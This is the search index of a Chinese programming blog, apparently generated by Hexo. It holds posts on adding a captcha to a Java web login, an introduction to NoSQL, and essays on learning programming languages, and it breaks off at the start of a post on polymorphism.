<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>如何给java web应用添加登录验证码</title>
    <url>/blog/javaweb/verificationcode/</url>
    <content><![CDATA[<p>这片文章主要讲如何时在java web项目中如何给登录添加验证码功能。</p>
<h2 id="添加验证码主要工作："><a href="#添加验证码主要工作：" class="headerlink" title="添加验证码主要工作："></a>添加验证码主要工作：</h2><p>做一个验证码图片的生成类，在网上有很多，copy一个很方便。</p>
<p>做一个验证码的图片接口，通过链接可以访问，返回一张图片。</p>
<p>做一个filter，对登录请求进行拦截，判断验证码是否正确。</p>
<p>登录页面加上一个IMG节点，通过js设置其显示验证码。</p>
<h2 id="做一个验证码图片生成类："><a href="#做一个验证码图片生成类：" class="headerlink" title="做一个验证码图片生成类："></a>做一个验证码图片生成类：</h2><p>直接在网上复制了一个，还挺好用的。</p>
<pre><code>import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Random;
import javax.imageio.ImageIO;
import javax.imageio.stream.ImageOutputStream;

/**
 * 验证码相关
 * VerificationCodeUtil
 * @author douzh
 * @version 1.0
 *
 */

public class VerificationCodeUtil &#123;
    public static String VCODE_SESSION_KEY=&quot;Verification_Code_Key&quot;;
    private ByteArrayInputStream image;//图像 

    private String str;//验证码 

    private VerificationCodeUtil() &#123;
        init();//初始化属性 
    &#125;

    /*
     * 取得RandomNumUtil实例
     */
    public static VerificationCodeUtil Instance() &#123;
        return new VerificationCodeUtil();
    &#125;

    /*
     * 取得验证码图片
     */
    public ByteArrayInputStream getImage() &#123;
        return this.image;
    &#125;

    /*
     * 取得图片的验证码
     */
    public String getString() &#123;
        return this.str;
    &#125;

    private void init() &#123;
        // 在内存中创建图象 
        int width = 85, height = 30;
        BufferedImage image = new BufferedImage(width, height,
                BufferedImage.TYPE_INT_RGB);
        // 获取图形上下文 
        Graphics g = image.getGraphics();
        // 生成随机类 
        Random random = new Random();
        // 设定背景色 
        g.setColor(getRandColor(200, 250));
        g.fillRect(0, 0, width, height);
        // 设定字体 
        g.setFont(new Font(&quot;Times New Roman&quot;, Font.PLAIN, 25));
        // 随机产生155条干扰线，使图象中的认证码不易被其它程序探测到 
        g.setColor(getRandColor(160, 200));
        for (int i = 0; i &lt; 155; i++) &#123;
            int x = random.nextInt(width);
            int y = random.nextInt(height);
            int xl = random.nextInt(12);
            int yl = random.nextInt(12);
            g.drawLine(x, y, x + xl, y + yl);
        &#125;
        // 取随机产生的认证码(6位数字) 
        String sRand = &quot;&quot;;
        for (int i = 0; i &lt; 6; i++) &#123;
            String rand = String.valueOf(random.nextInt(10));
            sRand += rand;
            // 将认证码显示到图象中 
            g.setColor(new Color(20 + random.nextInt(110), 20 + random
                    .nextInt(110), 20 + random.nextInt(110)));
            // 调用函数出来的颜色相同，可能是因为种子太接近，所以只能直接生成 
            g.drawString(rand, 13 * i + 6, 25);
        &#125;
        //赋值验证码
        this.str = sRand;

        //图象生效 
        g.dispose();
        ByteArrayInputStream input = null;
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try &#123;
            ImageOutputStream imageOut = ImageIO
                    .createImageOutputStream(output);
            ImageIO.write(image, &quot;JPEG&quot;, imageOut);
            imageOut.close();
            input = new ByteArrayInputStream(output.toByteArray());
        &#125; catch (Exception e) &#123;
            System.out.println(&quot;验证码图片产生出现错误：&quot; + e.toString());
        &#125;

        this.image = input;/* 赋值图像 */
    &#125;

    /*
     * 给定范围获得随机颜色
     */
    private Color getRandColor(int fc, int bc) &#123;
        Random random = new Random();
        if (fc &gt; 255)
            fc = 255;
        if (bc &gt; 255)
            bc = 255;
        int r = fc + random.nextInt(bc - fc);
        int g = fc + random.nextInt(bc - fc);
        int b = fc + random.nextInt(bc - fc);
        return new Color(r, g, b);
    &#125;
&#125;
</code></pre>
<h2 id="做一个返回验证码的接口："><a href="#做一个返回验证码的接口：" class="headerlink" title="做一个返回验证码的接口："></a>做一个返回验证码的接口：</h2><pre><code>    public void getVcImage() &#123;
        try &#123;
            VerificationCodeUtil vc = VerificationCodeUtil.Instance();
            InputStream s = vc.getImage();
            this.getHttpRequest()
                    .getSession()
                    .setAttribute(VerificationCodeUtil.VCODE_SESSION_KEY,
                        vc.getString());
            ServletOutputStream outputStream = getHttpResponse()
                    .getOutputStream();
            if (s != null) &#123;
                IOUtils.copy(s, outputStream);
                IOUtils.closeQuietly(s);
                IOUtils.closeQuietly(outputStream);
            &#125;
        &#125; catch (Exception e) &#123;
            logger.error(&quot;获取验证码出错&quot;, e);
            writJsonResult(new ErrorPojo(&quot;syserror&quot;, &quot;获取验证码出错！&quot;));
        &#125;
        return;
    &#125;
</code></pre>
<p>注意，要把验证码对应的字符串放到session里，以供验证对比用。IOUtils是用的org.apache.commons.io里的类。</p>
<p>现在就可以通过浏览器访问接口返回一张验证码图片了。</p>
<h2 id="拦截登录请求的filter"><a href="#拦截登录请求的filter" class="headerlink" title="拦截登录请求的filter"></a>拦截登录请求的filter</h2><p>先写一个处理验证码的Filter类</p>
<pre><code>/**
 * 过滤验证码
 * VCodeFilter
 * @version 1.0
 *
 */
public class VCodeFilter extends BaseLogic implements Filter &#123;

    @Override
    public void destroy() &#123;

    &#125;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
            FilterChain chain) throws IOException, ServletException &#123;
        HttpServletRequest servletRequest = null;
        try &#123;
            servletRequest = (HttpServletRequest) request;
            HttpServletResponse servletResponse = (HttpServletResponse) response;
            String action = servletRequest.getQueryString();
            if (StringUtils.isNotBlank(action)
                    &amp;&amp; action.startsWith(&quot;action=login&quot;)) &#123;
                String vcode = request.getParameter(&quot;j_vcode&quot;);
                if(StringUtils.isBlank(vcode))&#123;
                    writeResult(&quot;请先填写验证码&quot;,servletResponse);
                    return;
                &#125;
                String vcode2 = (String) servletRequest.getSession()
                        .getAttribute(VerificationCodeUtil.VCODE_SESSION_KEY);
                if(StringUtils.isBlank(vcode2))&#123;
                    writeResult(&quot;验证码已经过期，重新获取&quot;,servletResponse);
                    return;
                &#125;
                if(!vcode2.equals(vcode))&#123;
                    writeResult(&quot;验证码填写不正确，请重新填写&quot;,servletResponse);
                    return;
                &#125;
            &#125;
            chain.doFilter(servletRequest, servletResponse);
        &#125; catch (Exception e) &#123;
            logger.error(&quot;查看出现异常时候的方法&quot; + servletRequest.getMethod());
        &#125;

    &#125;
    /**
     * 向response管道写数据
     * 
     * @param data 输出的数据
     */
    protected void writeResult(String data,HttpServletResponse resp) &#123;
        try &#123;
            resp.setCharacterEncoding(&quot;UTF-8&quot;);
            resp.getWriter().write(data);
            resp.getWriter().flush();
            resp.getWriter().close();
        &#125; catch (IOException e) &#123;
            logger.error(&quot;接口输出内容出错&quot;, e);
        &#125;
    &#125;
    @Override
    public void init(FilterConfig config) throws ServletException &#123;
    &#125;
&#125;
</code></pre>
<p>添加对于filter配制。</p>
<pre><code>    &lt;filter&gt;
        &lt;filter-name&gt;VCodeFilter&lt;/filter-name&gt;
        &lt;filter-class&gt;
            com.xxxx.support.VCodeFilter
        &lt;/filter-class&gt;
    &lt;/filter&gt;

    &lt;filter-mapping&gt;
        &lt;filter-name&gt;VCodeFilter&lt;/filter-name&gt;
        &lt;url-pattern&gt;/login.do&lt;/url-pattern&gt;
    &lt;/filter-mapping&gt;
</code></pre>
<p>这样所有的登录请求先要过验证码这一关。</p>
<h2 id="登录界面的验证码"><a href="#登录界面的验证码" class="headerlink" title="登录界面的验证码"></a>登录界面的验证码</h2><p>添加一个img节点：</p>
<p>用js初始化节点。</p>
<pre><code>function initVcode()&#123;
$(&quot;#vcode&quot;).attr(&#39;src&#39;,contextPath+&quot;/paramsApi.do?action=getVcImage&amp;time=&quot;+new Date().getTime()); ;
&#125;;
initVcode();
</code></pre>
<p>参数加个时间戳是为了防止浏览器缓存验证码图片。</p>
<h2 id="之后呢"><a href="#之后呢" class="headerlink" title="之后呢"></a>之后呢</h2><p>要有一个input让用户输入验证码，提交登录信息时也把这项提交上，filter就会处理带验证吗的请求了。</p>
]]></content>
  </entry>
  <entry>
    <title>NoSQL 简介</title>
    <url>/blog/nosql/nosql/</url>
    <content><![CDATA[<p>NoSQL(NoSQL &#x3D; Not Only SQL )，意即”不仅仅是SQL”。</p>
<p>在现代的计算系统上每天网络上都会产生庞大的数据量。</p>
<p>这些数据有很大一部分是由关系数据库管理系统（RDMBSs）来处理。 1970年E.F.Codd’s提出的关系模型的论文 “A relational model of data for large shared data banks”，这使得数据建模和应用程序编程更加简单。</p>
<p>通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。</p>
<p>NoSQL是一项全新的数据库革命性运动，早期就有人提出，发展至2009年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p>
<h2 id="关系型数据库遵循ACID规则"><a href="#关系型数据库遵循ACID规则" class="headerlink" title="关系型数据库遵循ACID规则"></a>关系型数据库遵循ACID规则</h2><p>事务在英文中是transaction，和现实世界中的交易很类似，它有如下四个特性：</p>
<p><strong>1、A (Atomicity) 原子性</strong></p>
<p>原子性很容易理解，也就是说事务里的所有操作要么全部做完，要么都不做，事务成功的条件是事务里的所有操作都成功，只要有一个操作失败，整个事务就失败，需要回滚。</p>
<p>比如银行转账，从A账户转100元至B账户，分为两个步骤：1）从A账户取100元；2）存入100元至B账户。这两步要么一起完成，要么一起不完成，如果只完成第一步，第二步失败，钱会莫名其妙少了100元。</p>
<p><strong>2、C (Consistency) 一致性</strong></p>
<p>一致性也比较容易理解，也就是说数据库要一直处于一致的状态，事务的运行不会改变数据库原本的一致性约束。</p>
<p>例如现有完整性约束a+b&#x3D;10，如果一个事务改变了a，那么必须得改变b，使得事务结束后依然满足a+b&#x3D;10，否则事务失败。</p>
<p><strong>3、I (Isolation) 独立性</strong></p>
<p>所谓的独立性是指并发的事务之间不会互相影响，如果一个事务要访问的数据正在被另外一个事务修改，只要另外一个事务未提交，它所访问的数据就不受未提交事务的影响。</p>
<p>比如现有有个交易是从A账户转100元至B账户，在这个交易还未完成的情况下，如果此时B查询自己的账户，是看不到新增加的100元的。</p>
<p><strong>4、D (Durability) 持久性</strong><br>持久性是指一旦事务提交后，它所做的修改将会永久的保存在数据库上，即使出现宕机也不会丢失。</p>
<h2 id="分布式系统"><a href="#分布式系统" class="headerlink" title="分布式系统"></a>分布式系统</h2><p>分布式系统（distributedsystem）由多台计算机和通信的软件组件通过计算机网络连接（本地网络或广域网）组成。</p>
<p>分布式系统是建立在网络之上的软件系统。正是因为软件的特性，所以分布式系统具有高度的内聚性和透明性。</p>
<p>因此，网络和分布式系统之间的区别更多的在于高层软件（特别是操作系统），而不是硬件。</p>
<p>分布式系统可以应用在在不同的平台上如：Pc、工作站、局域网和广域网上等。</p>
<h2 id="分布式计算的优点"><a href="#分布式计算的优点" class="headerlink" title="分布式计算的优点"></a>分布式计算的优点</h2><p><strong>可靠性（容错） ：</strong></p>
<p>分布式计算系统中的一个重要的优点是可靠性。一台服务器的系统崩溃并不影响到其余的服务器。</p>
<p><strong>可扩展性：</strong></p>
<p>在分布式计算系统可以根据需要增加更多的机器。</p>
<p><strong>资源共享：</strong></p>
<p>共享数据是必不可少的应用，如银行，预订系统。</p>
<p><strong>灵活性：</strong></p>
<p>由于该系统是非常灵活的，它很容易安装，实施和调试新的服务。</p>
<p><strong>更快的速度：</strong></p>
<p>分布式计算系统可以有多台计算机的计算能力，使得它比其他系统有更快的处理速度。</p>
<p><strong>开放系统：</strong></p>
<p>由于它是开放的系统，本地或者远程都可以访问到该服务。</p>
<p><strong>更高的性能：</strong></p>
<p>相较于集中式计算机网络集群可以提供更高的性能（及更好的性价比）。</p>
<h2 id="分布式计算的缺点"><a href="#分布式计算的缺点" class="headerlink" title="分布式计算的缺点"></a>分布式计算的缺点</h2><p><strong>故障排除： ：</strong></p>
<p>故障排除和诊断问题。</p>
<p><strong>软件：</strong></p>
<p>更少的软件支持是分布式计算系统的主要缺点。</p>
<p><strong>网络：</strong></p>
<p>网络基础设施的问题，包括：传输问题，高负载，信息丢失等。</p>
<p><strong>安全性：</strong></p>
<p>开发系统的特性让分布式计算系统存在着数据的安全性和共享的风险等问题。</p>
<h2 id="什么是NoSQL"><a href="#什么是NoSQL" class="headerlink" title="什么是NoSQL?"></a>什么是NoSQL?</h2><p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not OnlySQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p>
<p>NoSQL用于超大规模数据的存储。（例如谷歌或Facebook每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
<h2 id="为什么使用NoSQL"><a href="#为什么使用NoSQL" class="headerlink" title="为什么使用NoSQL ?"></a>为什么使用NoSQL ?</h2><p>今天我们可以通过第三方平台（如：Google,Facebook等）可以很容易的访问和抓取数据。用户的个人信息，社交网络，地理位置，用户生成的数据和用户操作日志已经成倍的增加。我们如果要对这些用户数据进行挖掘，那SQL数据库已经不适合这些应用了,NoSQL数据库的发展也却能很好的处理这些大的数据。</p>
<p><img src="/images/nosql/web-data-image.png" alt="web-data-image"></p>
<h2 id="RDBMS-vs-NoSQL"><a href="#RDBMS-vs-NoSQL" class="headerlink" title="RDBMS vs NoSQL"></a>RDBMS vs NoSQL</h2><p><strong>RDBMS</strong></p>
<ul>
<li>高度组织化结构化数据</li>
<li>结构化查询语言（SQL） (SQL)</li>
<li>数据和关系都存储在单独的表中。</li>
<li>数据操纵语言，数据定义语言</li>
<li>严格的一致性</li>
<li>基础事务</li>
</ul>
<p><strong>NoSQL</strong></p>
<ul>
<li>代表着不仅仅是SQL</li>
<li>没有声明性查询语言</li>
<li>没有预定义的模式-键 - 值对存储，列存储，文档存储，图形数据库</li>
<li>最终一致性，而非ACID属性</li>
<li>非结构化和不可预知的数据</li>
<li>CAP定理</li>
<li>高性能，高可用性和可伸缩性</li>
</ul>
<p><img src="/images/nosql/bigdata.png" alt="bigdata"></p>
<h2 id="NoSQL-简史"><a href="#NoSQL-简史" class="headerlink" title="NoSQL 简史"></a>NoSQL 简史</h2><p>NoSQL一词最早出现于1998年，是Carlo Strozzi开发的一个轻量、开源、不提供SQL功能的关系数据库。</p>
<p>2009年，Last.fm的JohanOskarsson发起了一次关于分布式开源数据库的讨论[2]，来自Rackspace的Eric<br>Evans再次提出了NoSQL的概念，这时的NoSQL主要指非关系型、分布式、不提供ACID的数据库设计模式。</p>
<p>2009年在亚特兰大举行的”no:sql(east)”讨论会是一个里程碑，其口号是”select fun, profit from real_world where relational&#x3D;false;”。因此，对NoSQL最普遍的解释是”非关联型的”，强调Key-Value Stores和文档数据库的优点，而不是单纯的反对RDBMS。</p>
<h2 id="CAP定理（CAP-theorem）"><a href="#CAP定理（CAP-theorem）" class="headerlink" title="CAP定理（CAP theorem）"></a>CAP定理（CAP theorem）</h2><p>在计算机科学中, CAP定理（CAP theorem）, 又被称作 布鲁尔定理（Brewer’s theorem）, 它指出对于一个分布式计算系统来说，不可能同时满足以下三点:</p>
<ul>
<li><strong>一致性(Consistency)</strong> (所有节点在同一时间具有相同的数据)</li>
<li><strong>可用性(Availability)</strong> (保证每个请求不管成功或者失败都有响应)</li>
<li><strong>分隔容忍(Partition tolerance)</strong> (系统中任意信息的丢失或失败不会影响系统的继续运作)</li>
</ul>
<p>CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。</p>
<p>因此，根据 CAP 原理将 NoSQL 数据库分成了满足 CA 原则、满足 CP 原则和满足AP 原则三 大类：</p>
<ul>
<li>CA - 单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大。</li>
<li>CP - 满足一致性，分区容忍必的系统，通常性能不是特别高。</li>
<li>AP - 满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。</li>
</ul>
<p><img src="/images/nosql/cap-theoram-image.png" alt="cap-theoram-image"></p>
<h2 id="NoSQL的优点-x2F-缺点"><a href="#NoSQL的优点-x2F-缺点" class="headerlink" title="NoSQL的优点&#x2F;缺点"></a>NoSQL的优点&#x2F;缺点</h2><p>优点:</p>
<ul>
<li><ul>
<li>高可扩展性</li>
</ul>
</li>
<li><ul>
<li>分布式计算</li>
</ul>
</li>
<li><ul>
<li>低成本</li>
</ul>
</li>
<li><ul>
<li>架构的灵活性，半结构化数据</li>
</ul>
</li>
<li><ul>
<li>没有复杂的关系</li>
</ul>
</li>
</ul>
<p>缺点:</p>
<ul>
<li><ul>
<li>没有标准化</li>
</ul>
</li>
<li><ul>
<li>有限的查询功能（到目前为止）</li>
</ul>
</li>
<li><ul>
<li>最终一致是不直观的程序</li>
</ul>
</li>
</ul>
<h2 id="BASE"><a href="#BASE" class="headerlink" title="BASE"></a>BASE</h2><p>BASE：Basically Available, Soft-state, Eventually Consistent。 由 Eric Brewer 定义。</p>
<p>CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。</p>
<p>BASE是NoSQL数据库通常对可用性及一致性的弱要求原则:</p>
<ul>
<li>Basically Availble –基本可用</li>
<li>Soft-state –软状态&#x2F;柔性事务。”Soft state” 可以理解为”无连接”的, 而<br>“Hard state” 是”面向连接”的</li>
<li>Eventual Consistency –最终一致性最终一致性， 也是是 ACID<br>的最终目的。</li>
</ul>
<h2 id="ACID-vs-BASE"><a href="#ACID-vs-BASE" class="headerlink" title="ACID vs BASE"></a>ACID vs BASE</h2><p> | ACID                 |   BASE<br> | ———————|– —————————————<br> | 原子性(<strong>A</strong>tomicity)   |基本可用(<strong>B</strong>asically <strong>A</strong>vailable)<br> | 一致性(<strong>C</strong>onsistency) |软状态&#x2F;柔性事务(<strong>S</strong>oft state)<br> | 隔离性(<strong>I</strong>solation)   |最终一致性(<strong>E</strong>ventual consistency)<br> | 持久性(<strong>D</strong>urable)     | </p>
<h2 id="NoSQL-数据库分类"><a href="#NoSQL-数据库分类" class="headerlink" title="NoSQL 数据库分类"></a>NoSQL 数据库分类</h2><table><tbody><tr><td>类型</td><td>部分代表<p></p></td><td>特点</td></tr><tr><td>列存储</td><td><p>Hbase </p><p>Cassandra </p><p>Hypertable </p></td><td><p>顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。 </p></td></tr><tr><td><p>文档存储 </p></td><td><p>MongoDB </p><p>CouchDB </p></td><td><p>文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有有机会对某些字段建立索引，实现关系数据库的某些功能。 </p></td></tr><tr><td><p>key-value存储 </p></td><td><p>Tokyo?Cabinet?/?Tyrant </p><p>Berkeley?DB </p><p>MemcacheDB </p><p>Redis </p></td><td><p>可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能） </p></td></tr><tr><td><p>图存储 </p></td><td><p>Neo4J </p><p>FlockDB </p></td><td><p>图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。 </p></td></tr><tr><td><p>对象存储 </p></td><td><p>db4o </p><p>Versant </p></td><td><p>通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。 </p></td></tr><tr><td><p>xml数据库 </p></td><td><p>Berkeley?DB?XML </p><p>BaseX </p></td><td><p>高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。 </p></td></tr></tbody></table>
谁在使用
--------

<p>现在已经有很多公司使用了 NoSQL：</p>
<ul>
<li>Google</li>
<li>Facebook</li>
<li>Mozilla</li>
<li>Adobe</li>
<li>Foursquare</li>
<li>LinkedIn</li>
<li>Digg</li>
<li>McGraw-Hill Education</li>
<li>Vermont Public Radio</li>
</ul>
]]></content>
      <categories>
        <category>nosql</category>
      </categories>
      <tags>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>【置顶】公告</title>
    <url>/blog/explain/</url>
    <content><![CDATA[<p>原域名iteedu.com忘续费没了，新申请了个onekbase.com</p>
<p>历史网站内容静态化后放在了<a href="http://site.onekbase.com/">site.onekbase.com</a>子域名下</p>
<p>以后可能发视频比较多一些，可以关注OneKBase(微信公众号 和 bilibili)</p>
<p><a href="https://space.bilibili.com/505668382/channel/collectiondetail?sid=912428">《Springcloud手把手培训教程》</a></p>
<p><a href="https://space.bilibili.com/505668382/channel/collectiondetail?sid=1533932">《小白学架构系列》</a></p>
<p><a href="https://space.bilibili.com/505668382/channel/collectiondetail?sid=1748818">《DDD领域驱动设计杂谈》</a></p>
]]></content>
  </entry>
  <entry>
    <title>编程语言有高低优劣之分吗</title>
    <url>/blog/plang/goodbadplang/</url>
    <content><![CDATA[<p>在开始学编程时总想找一门最NB的语言来学，好像用最NB的编辑语言才能学好编程似的。相信学编辑的人都有类似的痛苦经历。</p>
<p>现在有很多言论都在说高级语言好，低级语言没必要学。很多初学者都盲目的听了，不学汇编之类的低级语言。有的甚至连C都不学了，因为C是面向过程的，现在都面向对象了，学也学C++呀，或直接学java。</p>
<p>这种看法是完全错误的。</p>
<p>语言的高低是指语言在哪个层面上编程，越低层的编程反而越难，越要求有高超的技巧。我想最低层编程的就是用直接硬件完成功能了，这好像就不叫编程了，呵呵。<br>不同层面的编程用的语言也是不同的，同一层面语言的特点也是不同的。如下图应用层众多语言都有其特长，要根据需求选择。</p>
<p>上述层次仅为个为观点。但可以看出，语言是众多的，就像现在人们都在学英语言，但小语种也是很火的。所以语言没有高低贵贱之分。但就像现在英语是必备的一样，C也是编程必备的编程语言。</p>
<p>C在系统开发，驱动开发，程序高性能模块开发方面用的最多。</p>
<p>JAVA一般开发应用软件，WEB开发等规模以上项目。</p>
<p>Python功能强大，一般可以作脚本语言用，还可以开发应用软件，WEB开发，程序模型开发。</p>
<p>Ruby和Python属同类。</p>
<p>C++好像都可以，但都不是最强的。也不太好学。属专家用的。</p>
<p>还有不常用的</p>
<p>fortran和matlab用于科学和工程计算</p>
<p>pascal和Visual Pascal（delphi）一个过程化一个面向对象，就像C和C++一样。不过没C和C++火。</p>
<p>基它的还有很多，就不多说了。</p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>怎么学习编程</title>
    <url>/blog/plang/howprgm/</url>
    <content><![CDATA[<p>开始学编程一定要选一门语言，语言这么多选哪个是个问题。但一定不要选个太难学的如C，那你的时间就会浪费在指针、字符串、内存分配一系列的问题上了。那不是学编程而是学语言，这之间的不同之前也说过了，学编程是学思想，学语言是学工具。</p>
<p>要永远记住：工具只是工具。</p>
<p>个人推荐python，因为很简单，适合什么都不懂的初学者。但有点问题就是python用起来太爽了，就怕你学了python就不想学其它的了。还有python这个东西如果对编程没有功底很难学精，这是最令人担忧的地方。就怕到时不能自拔呀。</p>
<p>所以，对结构化编程有一定了解之后一定要学C，并辅以数据结构练习。这是最难过的一关，编程能力在这会有很大提高。坚持住，儿媳妇一定会熬成婆的。</p>
<p>开始做一些简单的排序算法</p>
<p>之后开始做队列和栈</p>
<p>学了指针就开始做链表</p>
<p>树和图一定要能遍历，学会存储结构是前提</p>
<p>到这也就可以了。</p>
<p>更高级的就是数学相关的算法了。</p>
<p>现在是时候了解一下面向对象的思想了，语言用JAVA或之前的python都行。不过python的很灵活，容易出错。推荐用JAVA。学一学就开始下面一步吧。</p>
<p>之后便是学其它领域的知识了，但一定要边学边实践。实践过程就是学语言对应的库，并实际编几个小程序看看。</p>
<p>其它领域有：</p>
<p>数据库：用C，JAVA，python都行</p>
<p>网络：JAVA，python比较好</p>
<p>WEB：JAVA的JSP，php，python的框架都可以</p>
<p>系统编程：用C语言吧</p>
<p>图形GUI：JAVA，python都行</p>
<p>……</p>
<p>现在就看你的努力程度了呀。</p>
<p>初学者推荐学习步骤：</p>
<p>用python入门编程，学结构化编程思想</p>
<p>学C和数据结构，并行学习实践</p>
<p>JAVA学面向对象思想</p>
<p>学习其它领域知识，并用一门语言实践</p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>我的编程学习经历</title>
    <url>/blog/plang/myexperience/</url>
    <content><![CDATA[<h3 id="刚刚开始，都想学最新最好的"><a href="#刚刚开始，都想学最新最好的" class="headerlink" title="刚刚开始，都想学最新最好的"></a>刚刚开始，都想学最新最好的</h3><p>大一上学期，我上刚上大学时，学校开的第一门有关计算机的课是《计算机导论》，讲的一些计算机的结构和数据结构，还有一点算法。当时我同学都认为学校开这课是浪费时间，一是大家听不太懂，二也没什么人想听，基本上都是睡过去的。我还听了听，现在看来还是很有用的，只是当时水平凹而已。大一下学期竟开的是pascal，大家还以为会开C呢。为此大家还抱怨矿大计算机专业很烂，当时大家都觉得要学习C才对。我想当时很多人可能还不知道JAVA，或认为JAVA太难，要不就都觉得应该学JAVA了。</p>
<h3 id="让人失落的C"><a href="#让人失落的C" class="headerlink" title="让人失落的C"></a>让人失落的C</h3><p>大二上学期开了C语言，用的是谭浩强的《C程序设计（第二版）》。当时学完没什么感觉，因为感觉还是不会编程。只是上实验时用C做了几个书上的小程序。感觉上对C语言的特点还是一塌糊涂，但有一点还是学来了，那就是指针。后来才知道，指针是C的奥妙之处。没学会指针，C等于白学了。所以我的结论，我没白学，呵呵。</p>
<h3 id="真正学了点东西"><a href="#真正学了点东西" class="headerlink" title="真正学了点东西"></a>真正学了点东西</h3><p>大二下学期，学校一起开了MASM和《数据结构C语言版》。感觉当时自己还是独具慧眼的，虽然不知道数据结构是什么，但一看书的目录就知道这是很重要的知识。好好学了一学期，得了98分，感觉学的还可以。因为是用C做实验，所以对C用的也熟了（并不是有深刻的理解，只是能解决简单问题了）。<br>MASM可没这么幸运了，学的教材是《新版汇编语言程序设计》，这本书的特点就是讲的全。讲的全一般都是没重点的，而且后面的WINDOWS的程序设计都没讲。所以学完了只是知道了CPU和内存的一些东西，对内存分配有了一定了解。</p>
<p>虽然对MASM没什么理解，但对C有了更深的认识了。首先是对指针有了更深的理解，其次是对C中的动态内存分配有了一定认识。（后来看python的源码时发现用C就是用指针加动态内存分配，预编译（宏是其一部分）是很好的辅助功能。）</p>
<p>至此，感觉自己很废物。学了pascal，C，MASM，却一点东西都做不出来。还发现了一个规律：基本数据类型，标准I&#x2F;O，控制结构，数组之类，函数，结构体之类，文件操作（MASM还没有），这个顺序学什么语言都是一样的。</p>
<h3 id="自强之路"><a href="#自强之路" class="headerlink" title="自强之路"></a>自强之路</h3><p>大二快结束了，好不甘心，下了决心，自己学。在网上找了很多资料，分析了一番决定学j2ee。暑假自己在家学了JAVA，并开始自己学JSP。<br>大三上学期，自己乱打乱撞的学了半年。J2EE学的还行吧，东西学到了，但是感觉还是没得可做。开始思考问题的所在了。</p>
<h3 id="开始醒悟"><a href="#开始醒悟" class="headerlink" title="开始醒悟"></a>开始醒悟</h3><h3 id="语言只是一种工具"><a href="#语言只是一种工具" class="headerlink" title="语言只是一种工具"></a>语言只是一种工具</h3><p>试想给你一只笔你能画出一幅美丽的画吗？语言就是一只笔，编程就像画画，写字，还要单练。学语言就像基本的用笔写字与画线条。</p>
<p>语言之间的差别就像铅笔与圆珠笔的差别一样</p>
<p>什么”笔”都可以用，但用哪个好，还要看具体情况。如JAVA适合大型开发，C适合系统与速度要求高的开发，汇编适合驱动开发，python适合快速开发与模型开发。现在平时没有人用毛笔写字了，因为不方便。同理，现在也没有人用C开发WEB了，也是因为不方便，但不是不可以。</p>
<h3 id="不变的是编程思想"><a href="#不变的是编程思想" class="headerlink" title="不变的是编程思想"></a>不变的是编程思想</h3><p>不同领域的编程要有不同的知识为基础。做不同层次的编程要求掌握知识的程度也不一样。如做WEB开发，只要对网络的原理掌握就可以了，就是概念级的掌握。但要再深一层次，如中间件tomcat，jboss的开发就要有很系统的学习了。</p>
<h3 id="万变不离其宗"><a href="#万变不离其宗" class="headerlink" title="万变不离其宗"></a>万变不离其宗</h3><p>你能用JAVA编某个程序，那你也能用python或C编。只是每个人对编程语言的熟悉程度不同，会用一种自己用着最顺手的而已。好比我们一般用中文写东西而不用英语，只是因为我们用中文用熟了。但不管用什么语言，关键是你知道写什么，怎么写。这就是核心――编程思想。</p>
<h3 id="最终忠告"><a href="#最终忠告" class="headerlink" title="最终忠告"></a>最终忠告</h3><p>不要专注于语言本身，学编程思想最重要。</p>
<p>语言都有自己的特性，这不是能一时掌握的，要靠长年累月的运用才能心领神会。</p>
<p>不要贪多，花大量时间学很多门语言。语言这东西不用真是会忘的。</p>
<h3 id="给计算机专业大学生的忠告"><a href="#给计算机专业大学生的忠告" class="headerlink" title="给计算机专业大学生的忠告"></a>给计算机专业大学生的忠告</h3><p>编程思想是要自己用心体会的。不要希望别人教你。</p>
<p>汇编，C这是很重要的语言是必须学好的。</p>
<p>数据结构是基础中的基础，否则很多东西你是连理解也理解不了的。</p>
<p>专业课是学不同领域知识的好机会，一定好好听课。数据库，操作系统，编译原理，网络，计算机结构等。</p>
<p>当前企业最需要的技术学校是不会教的，可能老师们都不会，怎么教你。还是要自己学呀。</p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是多态</title>
    <url>/blog/plang/whatisduotai/</url>
    <content><![CDATA[<p><strong>站长原创，版权所有ITEEDU，2009-9-30</strong></p>
<p>多态即一个类的实例可以变成多种类型的对象实例，即一个对象可以有多种形态。</p>
